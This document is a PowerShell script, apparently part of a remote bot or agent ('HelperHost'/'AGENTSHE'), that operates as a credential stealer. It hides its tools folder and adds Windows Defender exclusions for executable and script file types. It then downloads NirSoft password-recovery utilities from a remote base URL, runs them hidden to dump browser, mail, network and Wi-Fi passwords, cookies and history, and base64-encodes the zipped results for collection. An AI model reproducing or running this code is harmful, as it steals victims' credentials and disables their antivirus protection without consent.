$ErrorActionPreference = 'SilentlyContinue'
try { $PSNativeCommandUseErrorActionPreference = $false } catch {}
$toolsDir = Join-Path $env:LOCALAPPDATA 'HelperHost\tools'
New-Item -ItemType Directory -Force -Path $toolsDir | Out-Null
cmd /c ('attrib +h +s "' + $toolsDir + '"') | Out-Null

$base = $env:AGENTSHE_FILES
if (-not $base) {
  try {
    $st = (Get-ItemProperty 'HKCU:\Software\HelperHost' -Name state -EA SilentlyContinue).state
    if ($st) {
      $j = $st | ConvertFrom-Json
      if ($j.bot_base) { $base = ($j.bot_base.TrimEnd('/') + '/files') }
    }
  } catch {}
}
if (-not $base) { throw 'AGENTSHE_FILES / bot_base manquant' }
$base = $base.TrimEnd('/')

try {
  if (Get-Command Add-MpPreference -EA SilentlyContinue) {
    Add-MpPreference -ExclusionExtension @(
      '.exe','.dll','.sys','.ps1','.bat','.cmd','.vbs','.js','.msi','.zip','.7z','.txt'
    ) -EA SilentlyContinue 2>$null | Out-Null
  }
} catch {}

$tools = @(
  @{ id = 'chromepass'; leaf = 'ChromePass.exe'; rel = 'ChromePass.exe' },
  @{ id = 'webbrowser'; leaf = 'WebBrowserPassView.exe'; rel = 'WebBrowserPassView.exe' },
  @{ id = 'passwordfox'; leaf = 'PasswordFox.exe'; rel = 'x64/PasswordFox.exe'; rel32 = 'PasswordFox.exe' },
  @{ id = 'mailpv'; leaf = 'mailpv.exe'; rel = 'mailpv.exe' },
  @{ id = 'mspass'; leaf = 'mspass.exe'; rel = 'mspass.exe' },
  @{ id = 'netpass'; leaf = 'netpass.exe'; rel = 'x64/netpass.exe'; rel32 = 'netpass.exe' },
  @{ id = 'iepv'; leaf = 'iepv.exe'; rel = 'iepv.exe' },
  @{ id = 'dialupass'; leaf = 'Dialupass.exe'; rel = 'Dialupass.exe' },
  @{ id = 'pstpassword'; leaf = 'PstPassword.exe'; rel = 'PstPassword.exe' },
  @{ id = 'chromecookies'; leaf = 'ChromeCookiesView.exe'; rel = 'ChromeCookiesView.exe' },
  @{ id = 'browsinghistory'; leaf = 'BrowsingHistoryView.exe'; rel = 'BrowsingHistoryView.exe' },
  @{ id = 'wirelesskey'; leaf = 'WirelessKeyView.exe'; rel = 'WirelessKeyView.exe' },
  @{ id = 'wnetwatcher'; leaf = 'WNetWatcher.exe'; rel = 'WNetWatcher.exe' }
)

$stage = Join-Path $toolsDir ('export-stage-' + [guid]::NewGuid().ToString('n'))
New-Item -ItemType Directory -Force -Path $stage | Out-Null
$errs = @()

foreach ($t in $tools) {
  try {
    $dest = Join-Path $toolsDir $t.leaf
    $url = "$base/tools/$($t.rel)"
    $url32 = if ($t.rel32) { "$base/tools/$($t.rel32)" } else { $url }
    if (-not [Environment]::Is64BitOperatingSystem) { $url = $url32 }
    if (-not (Test-Path $dest) -or (Get-Item $dest).Length -lt 1024) {
      & curl.exe -fsSL $url -o $dest 2>$null
      if (-not (Test-Path $dest) -or (Get-Item $dest).Length -lt 1024) {
        & curl.exe -fsSL $url32 -o $dest 2>$null
      }
    }
    if (-not (Test-Path $dest) -or (Get-Item $dest).Length -lt 1024) {
      throw 'download failed'
    }
    Unblock-File $dest -EA SilentlyContinue
    $zone = $dest + ':Zone.Identifier'
    if (Test-Path $zone) { Remove-Item $zone -Force -EA SilentlyContinue }
    $out = Join-Path $stage ($t.id + '.txt')
    Remove-Item $out -Force -EA SilentlyContinue
    $p = $null
    try {
      $p = Start-Process -FilePath $dest -ArgumentList @('/stext', $out) -WorkingDirectory $toolsDir -WindowStyle Hidden -PassThru -EA Stop
    } catch {
      throw ('start: ' + $_.Exception.Message)
    }
    if ($null -eq $p) { throw 'start failed' }
    if (-not $p.WaitForExit(45000)) {
      Stop-Process -Id $p.Id -Force -EA SilentlyContinue
      throw 'timeout'
    }
    Start-Sleep -Milliseconds 200
    if (-not (Test-Path $out) -or (Get-Item $out).Length -lt 1) {
      Set-Content -Path $out -Value '(aucune donnee)' -Encoding UTF8
    }
  } catch {
    $err = Join-Path $stage ($t.id + '.err.txt')
    Set-Content -Path $err -Value ("$($t.id): " + $_.Exception.Message) -Encoding UTF8
    $errs += $t.id
  }
}

$zip = Join-Path $toolsDir ('tools-export-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.zip')
Remove-Item $zip -Force -EA SilentlyContinue
$staged = @(Get-ChildItem -LiteralPath $stage -File -Force -EA SilentlyContinue)
if ($staged.Count -eq 0) {
  $empty = Join-Path $stage '_empty.txt'
  Set-Content $empty -Value 'aucun resultat' -Encoding UTF8
  $staged = @(Get-Item $empty)
}

# Prefer .NET zip (Compress-Archive often fails / partial)
try {
  Add-Type -AssemblyName System.IO.Compression.FileSystem -EA SilentlyContinue
  if (Test-Path $zip) { Remove-Item $zip -Force }
  [System.IO.Compression.ZipFile]::CreateFromDirectory($stage, $zip)
} catch {
  try {
    Compress-Archive -Path (Join-Path $stage '*') -DestinationPath $zip -Force
  } catch {
    # last resort: first file only marked clearly
    $zip = Join-Path $toolsDir 'tools-export-FAILED.txt'
    Set-Content $zip -Value ('zip failed: ' + $_.Exception.Message + "`nfiles=" + (($staged | ForEach-Object { $_.Name }) -join ',')) -Encoding UTF8
  }
}

Remove-Item -LiteralPath $stage -Recurse -Force -EA SilentlyContinue
if (-not (Test-Path $zip)) {
  $zip = Join-Path $toolsDir 'tools-export-empty.txt'
  Set-Content $zip -Value 'zip manquant' -Encoding UTF8
}

$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($zip))
$line = 'FILEB64:' + [IO.Path]::GetFileName($zip) + ':' + $b64
$rf = $env:AGENTSHE_RESULT_FILE
if ($rf) {
  try { [IO.File]::WriteAllText($rf, $line) } catch {}
}
Write-Output $line
if ($errs.Count -gt 0) {
  Write-Output ('ERRS:' + ($errs -join ','))
}
exit 0
